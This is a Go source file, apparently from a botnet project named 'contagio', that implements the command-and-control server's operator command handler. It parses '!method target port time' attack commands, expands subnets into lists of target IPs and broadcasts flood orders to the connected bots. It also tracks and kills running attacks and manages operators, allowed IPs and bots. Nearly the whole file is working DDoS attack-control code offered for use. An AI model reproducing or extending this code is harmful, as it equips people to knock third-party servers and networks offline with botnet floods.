package cnc

import (
	"bufio"
	"bytes"
	"contagio/contagio/bot_server"
	"contagio/contagio/cnc/utils"
	"contagio/contagio/config"
	"contagio/contagio/database/sqlite"
	"fmt"
	"net"
	"net/textproto"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"
)

func (c *Connection) CommandHandler() error {

	defer Catch()

	_, err := c.Send([]byte(c.GenerateCmdPrompt(c.config.Cnc.CmdPrompt)))
	if err != nil {
		c.conn.Close()
		return err
	}

	reader := bufio.NewReader(c.conn)
	tp := textproto.NewReader(reader)
	_command, err := tp.ReadLine()
	if err != nil {
		c.conn.Close()
		return err
	}

	c.s.AddIncoming(len(_command))

	command := []byte(_command)

	if bytes.EqualFold(command, []byte{255, 244, 255, 253, 6}) { // ctrl +c
		c.conn.Close()
		return nil
	}

	if bytes.HasPrefix(command, []byte{101, 120, 105, 116}) || bytes.HasPrefix(command, []byte{113, 117, 105, 116}) { // exit /quit
		c.conn.Close()
		return nil
	}

	if bytes.HasPrefix(command, []byte{99, 108, 115}) || bytes.HasPrefix(command, []byte{99, 108, 101, 97, 114}) {
		c.CncMainMenu()
		return nil
	}

	if bytes.HasPrefix(command, []byte{104, 101, 108, 112}) || bytes.HasPrefix(command, []byte{63}) {
		c.Help()
		return nil
	}

	if !bytes.HasPrefix(command, []byte{33}) {

		for _, i := range CmdList {
			if bytes.HasPrefix(command, i.Uint8) {
				i.function(_command, c)
				return nil
			}
		}
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return nil
	} else {
		for _, i := range MethodsList {
			if bytes.HasPrefix(command, i.Uint8) {
				err := c.isSyntaxError(_command, i)
				if err {
					c.Send([]byte(c.correctSyntax(_command, i)))
					return nil
				}

				cmd := strings.Split(_command, " ")

				var ip_count int

				if i.Subnet && strings.Contains(cmd[1], "/") {
					ips, err := parseSubnet(cmd[1])
					if err != nil {
						c.Send([]byte(config.ParseColors(c.config.Cnc.InvalidSubnetError)))
						return nil
					}

					ip_count = len(ips)

					go func() {
						for _, ip := range ips {

							l := c.NewLog(ATTACK_STARTED, ip, strings.TrimPrefix(cmd[0], "!"), cmd[3], cmd[2])
							go l.SendLog()

							id := c.genId()

							go c.NewAttack(cmd[3], strings.TrimPrefix(cmd[0], "!"), ip, cmd[2], id)

							broadcast_command := fmt.Sprintf("%s %s %s %s id=%s", cmd[0], ip, cmd[2], cmd[3], strconv.Itoa(id))
							go bot_server.Broadcast(broadcast_command)
							time.Sleep(100 * time.Millisecond)
						}
					}()

					bc := bot_server.BotCount
					botsc := strings.ReplaceAll(c.config.Cnc.SubnetCommandSent, "{bots}", strconv.Itoa(bc))
					botsc = strings.ReplaceAll(botsc, "{target_ips}", strconv.Itoa(ip_count))

					c.Send([]byte(config.ParseColors(botsc)))
					return nil

				}
				l := c.NewLog(ATTACK_STARTED, cmd[1], strings.TrimPrefix(cmd[0], "!"), cmd[3], cmd[2])
				go l.SendLog()

				id := c.genId()

				go c.NewAttack(cmd[3], strings.TrimPrefix(cmd[0], "!"), cmd[1], cmd[2], id)

				go bot_server.Broadcast(_command + " id=" + strconv.Itoa(id))
				bc := bot_server.BotCount
				botsc := strings.ReplaceAll(c.config.Cnc.CommandSent, "{bots}", strconv.Itoa(bc))
				botsc = strings.ReplaceAll(botsc, "{id}", strconv.Itoa(id))
				c.Send([]byte(config.ParseColors(botsc)))
				return nil

			}

		}

	}

	c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
	return nil
}

func parseSubnet(command string) ([]string, error) {
	var ips = make([]string, 0)

	ip, ipNet, err := net.ParseCIDR(command)
	if err != nil {
		return nil, err
	}

	for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}

	return ips, nil
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func (c *Connection) genId() int {
	id := utils.RandomInt(3)

	_, ok := AttackMap.Load(id)
	if ok {
		return c.genId()
	}

	return id
}

func (c *Connection) isSyntaxError(command string, cmdinfo MethodsInfo) bool {

	defer Catch()
	cmd := strings.Split(command, " ")

	// !cmd 1.1.1.1 443 60
	if len(cmd) < 4 {
		return true
	}

	_, err := strconv.Atoi(cmd[3])
	if err != nil {
		return true
	}

	port, err := strconv.Atoi(cmd[2])
	if err != nil {
		return true
	}
	if port > 65535 || port < 0 {
		return true
	}

	if cmdinfo.Layer == 4 {

		var _ip string

		ip := strings.Split(cmd[1], ".")

		if len(ip) != 4 {
			return true
		}

		_ip = cmd[1]

		if cmdinfo.Subnet {
			if strings.Contains(ip[3], "/") { // subnet
				__ip := strings.Split(cmd[1], "/")
				_ip = __ip[0]
				ip = strings.Split(_ip, ".")

			}
		}

		for _, _oct := range ip {
			oct, err := strconv.Atoi(_oct)
			if err != nil || oct > 255 || oct < 0 {
				return true
			}
		}

		err := net.ParseIP(_ip)
		if err == nil {
			return true
		}

	} else {
		if !strings.HasPrefix(cmd[1], "https://") && !strings.HasPrefix(cmd[1], "http://") {
			return true
		}
	}

	return false

}

func (c *Connection) correctSyntax(command string, cmdinfo MethodsInfo) string {

	defer Catch()

	var synt, syntexample string
	var res = c.config.Cnc.InvalidCommandSyntaxError

	args := strings.Split(command, " ")

	if cmdinfo.Layer == 7 {
		synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
		syntexample = fmt.Sprintf("%s https://example.com 443 60", args[0])
	} else { // layer 4
		synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
		syntexample = fmt.Sprintf("%s 1.1.1.1 22 60", args[0])
	}

	res = strings.ReplaceAll(res, "{syntax}", synt)
	res = strings.ReplaceAll(res, "{example}", syntexample)

	return config.ParseColors(res)

}

func Adduser(command string, c *Connection) {

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = config.ParseColors(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 3 {
		res = strings.ReplaceAll(res, "{syntax}", "adduser <LOGIN> <PASSWORD>")
		res = strings.ReplaceAll(res, "{example}", "adduser user pass")

		c.Send([]byte(config.ParseColors(res)))
		return
	}

	sqlite.AddUser(cmd[1], cmd[2])
	c.Send([]byte(suc))

}

func Bots(command string, c *Connection) {

	defer Catch()

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	tot, bc := bot_server.GetBots()

	if bc == "" {
		c.Send([]byte(config.ParseColors(c.config.Cnc.NoBotsConnectedError)))
		return
	}

	botsc := strings.ReplaceAll(c.config.Cnc.BotCount, "{bots}", bc)
	botsc = strings.ReplaceAll(botsc, "{total}", strconv.Itoa(tot))

	c.Send([]byte(config.ParseColors(botsc)))
}

func RemoveUser(command string, c *Connection) {
	// admin perms
	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = config.ParseColors(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "removeuser <LOGIN>")
		res = strings.ReplaceAll(res, "{example}", "removeuser user")

		c.Send([]byte(config.ParseColors(res)))
		return
	}

	sqlite.RemoveUser(cmd[1])
	c.Send([]byte(suc))

}

func AddIp(command string, c *Connection) {
	// admin perms

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = config.ParseColors(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "addip <IP>")
		res = strings.ReplaceAll(res, "{example}", "addip 127.0.0.1")

		c.Send([]byte(config.ParseColors(res)))
		return
	}

	sqlite.AddIp(cmd[1])
	c.Send([]byte(suc))

}

func RemoveIp(command string, c *Connection) {

	// admin perms

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = config.ParseColors(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "removeip <IP>")
		res = strings.ReplaceAll(res, "{example}", "removeip 127.0.0.1")

		c.Send([]byte(config.ParseColors(res)))
		return
	}

	sqlite.RemoveIp(cmd[1])
	c.Send([]byte(suc))

}

func Methods(command string, c *Connection) {
	defer Catch()

	if c.config.Cnc.CustomMethodsEnabled {
		for _, i := range c.config.Cnc.CustomMethods {
			c.Send([]byte(config.ParseColors(i)))
		}
		return
	}

	methods := c.config.Cnc.MethodsCommand

	var temp string
	var f = make([]string, 0)
	var a = make([]string, 0)
	var res = make([]string, 0)

	for range MethodsList {
		temp += methods + "\n"
	}

	for x, i := range strings.Split(temp, "\n") {
		a = append(a, strings.Replace(i, "{name}", MethodsList[x].Name, 1))
	}

	for x, i := range a {
		f = append(f, strings.Replace(i, "{description}", MethodsList[x].Description, 1))
	}

	for x, i := range f {
		res = append(res, strings.Replace(i, "{layer}", strconv.Itoa(MethodsList[x].Layer), 1))
	}

	c.Send(bytes.TrimSuffix([]byte(config.ParseColors(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
}

func (c *Connection) Help() {
	defer Catch()

	if c.config.Cnc.CustomHelpEnabled {
		for _, i := range c.config.Cnc.CustomHelp {
			c.Send([]byte(config.ParseColors(i)))
		}
		return
	}

	help := c.config.Cnc.HelpCommand

	var temp string
	var f = make([]string, 0)
	var res = make([]string, 0)

	for range CmdList {
		temp += help + "\n"
	}

	for x, i := range strings.Split(temp, "\n") {
		f = append(f, strings.Replace(i, "{command}", CmdList[x].Name, 1))
	}

	for x, i := range f {
		res = append(res, strings.Replace(i, "{description}", CmdList[x].Description, 1))

	}

	c.Send(bytes.TrimSuffix([]byte(config.ParseColors(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
}

func RunningCnc(_ string, c *Connection) {

	tab := strings.Builder{}

	w := tabwriter.NewWriter(&tab, 10, 10, 4, ' ', tabwriter.TabIndent)
	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "ID", "Target", "Method", "Port", "Length", "Finish", "User")
	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "======", "======", "======", "======", "======", "======", "======")
	AttackMap.Range(func(key, value interface{}) bool {
		i := value.(attackStruct)
		if i.Login == c.login || c.login == c.config.RootLogin {
			fmt.Fprintf(w, "\n%d\t%s\t%s\t%s\t%s\t%s\t%s\t\r", i.ID, strings.TrimPrefix(i.Target, "https://"), i.Method, i.Port, strconv.Itoa(i.Duration), strconv.Itoa(i.Finish), i.Login)
			fmt.Fprintln(w)
		}
		return true
	})

	w.Flush()
	if tab.Len() < 160 { // default len 144
		c.Send([]byte(config.ParseColors(c.config.Cnc.NoActiveAttacksError)))
		return
	}
	c.Send([]byte(tab.String()))
}
func (c *Connection) NewAttack(duration string, method string, target string, port string, id int) {
	defer Catch()

	dur, err := strconv.Atoi(duration)
	if err != nil {
		return
	}

	var wg sync.WaitGroup
	wg.Add(1)
	ch := make(chan int)

	go func() {
		defer wg.Done()

		for i := 0; i <= dur; i++ {
			select {
			case idd := <-ch:
				if idd == id {
					AttackMap.Delete(idd)
					return
				}
			default:
				var str = attackStruct{
					ch:       ch,
					ID:       id,
					Duration: dur,
					Finish:   dur - i,
					Login:    c.login,
					Method:   method,
					Target:   target,
					Port:     port,
				}

				AttackMap.Store(id, str)
				if i == dur {
					AttackMap.Delete(id)
				}

				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()
}

func GetRunningAttacks() int {
	var count int

	AttackMap.Range(func(_, _ any) bool {
		count++
		return true
	})

	return count

}

func KillAttack(command string, c *Connection) {
	_id := strings.Split(command, " ")

	var res = c.config.Cnc.CommandInvalidSyntax

	if len(_id) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "kill <ATTACK ID>")
		res = strings.ReplaceAll(res, "{example}", "kill 123")

		c.Send([]byte(config.ParseColors(res)))
		return
	}

	id, err := strconv.Atoi(_id[1])
	if err != nil {
		c.Send([]byte(config.ParseColors(c.config.Cnc.AttackIdNotFoundError)))
		return
	}

	if v, ok := AttackMap.Load(id); ok {
		bot_server.Broadcast("!kill " + _id[1])
		go func() {
			v.(attackStruct).ch <- id
		}()
	} else {
		c.Send([]byte(config.ParseColors(c.config.Cnc.AttackIdNotFoundError)))
		return
	}

	c.Send([]byte(config.ParseColors(c.config.Cnc.CommandExecuted)))

}

func DeleteBot(command string, c *Connection) {

	if c.login != c.config.RootLogin {
		c.Send([]byte(config.ParseColors(c.config.Cnc.UnknownCommandError)))
		return
	}

	ip := strings.Split(command, " ")

	var res = c.config.Cnc.CommandInvalidSyntax

	if len(ip) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "delete <BOT IP>")
		res = strings.ReplaceAll(res, "{example}", "delete 127.0.0.1")
		c.Send([]byte(config.ParseColors(res)))
		return
	}

	if len(ip[1]) < 3 {
		res = strings.ReplaceAll(res, "{syntax}", "delete <BOT IP>")
		res = strings.ReplaceAll(res, "{example}", "delete 127.0.0.1")
		c.Send([]byte(config.ParseColors(res)))
		return
	}

	if !bot_server.DeleteBot(ip[1]) {
		c.Send([]byte(config.ParseColors(c.config.Cnc.IpNotFoundError)))
		return
	}

	c.Send([]byte(config.ParseColors(c.config.Cnc.CommandExecuted)))
}
